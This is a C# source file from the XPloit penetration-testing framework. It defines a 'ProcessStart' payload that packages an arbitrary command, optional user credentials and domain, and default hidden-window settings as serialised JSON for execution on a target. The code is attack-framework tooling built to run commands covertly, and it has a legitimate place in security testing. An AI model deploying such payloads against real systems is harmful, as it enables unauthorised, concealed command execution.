using System.Diagnostics;
using System.Security;
using XPloit.Core;
using XPloit.Core.Helpers;

namespace XPloit.Modules.Payloads.Multi
{
    public class ProcessStartPayload : Payload
    {
        public override string Author { get { return "Fernando Díaz Toledano"; } }
        public override string Description { get { return "Execute a raw command"; } }
        public override string Name { get { return "ProcessStart"; } }
        public override string Path { get { return "Payloads/Multi"; } }

        #region Properties
        public string Password { get; set; }
        public string UserName { get; set; }
        public string FileName { get; set; }
        public string Arguments { get; set; }
        public bool CreateNoWindow { get; set; }
        public string Domain { get; set; }
        public bool UseShellExecute { get; set; }
        public string Verb { get; set; }
        public ProcessWindowStyle ProcessWindowStyle { get; set; }
        #endregion

        public ProcessStartPayload()
        {
            // Default variables
            Arguments = "";
            FileName = "";
            Password = null;
            UserName = null;

            CreateNoWindow = true;
            Domain = null;
            UseShellExecute = false;
            Verb = null;
            ProcessWindowStyle = ProcessWindowStyle.Hidden;
        }

        /// <summary>
        /// Payload Value
        /// </summary>
        public override byte[] Value
        {
            get
            {
                ProcessStartInfo pi = new ProcessStartInfo()
                 {
                     Arguments = this.Arguments,
                     CreateNoWindow = this.CreateNoWindow,
                     Domain = this.Domain,
                     FileName = this.FileName,
                     UserName = this.UserName,
                     UseShellExecute = this.UseShellExecute,
                     Verb = this.Verb,
                     WindowStyle = this.ProcessWindowStyle,
                 };

                // Append password
                if (!string.IsNullOrEmpty(this.Password))
                {
                    pi.Password = new SecureString();
                    foreach (char c in this.Password.ToCharArray())
                        pi.Password.AppendChar(c);
                }

                return this.Encoding.GetBytes(SerializationJsonHelper.Serialize(pi));
            }
        }
    }
}